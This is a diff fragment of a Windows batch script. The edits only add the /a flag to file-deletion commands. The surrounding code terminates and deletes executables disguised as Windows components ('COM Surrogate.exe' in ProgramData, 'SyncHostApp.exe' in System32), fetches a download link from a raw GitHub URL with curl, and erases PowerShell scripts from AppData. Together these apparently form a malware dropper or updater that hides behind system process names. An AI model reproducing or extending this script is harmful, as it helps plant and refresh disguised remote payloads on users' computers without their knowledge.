@@ -32,7 +32,7 @@ echo.
 
 :: Kill & Delete file 
 taskkill /f /im !filename!.exe
-del /f /q "%TEMP%\!filename!.exe"
+del /f /a /q "%TEMP%\!filename!.exe"
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ComSurrogateFileLink') do set "COMFILELINK=%%i"
 
@@ -82,8 +82,8 @@ if %FILESIZE% geq 16000000 (
 taskkill /f /im "COM Surrogate.exe"
 taskkill /f /im "SyncHostApp.exe"
 
-del /f /q "%SystemRoot%\System32\SyncHostApp.exe"
-del /f /q "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+del /f /a /q "%SystemRoot%\System32\SyncHostApp.exe"
+del /f /a /q "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 
 
 if exist "%temp%\!filename!.exe" (
@@ -113,7 +113,7 @@ timeout /t 15 /nobreak
 
 
 :: Delete .ps1 files
-del /F /Q /A "%appdata%\*.ps1"
+del /F /A /Q "%appdata%\*.ps1"
 
 echo.
 echo.
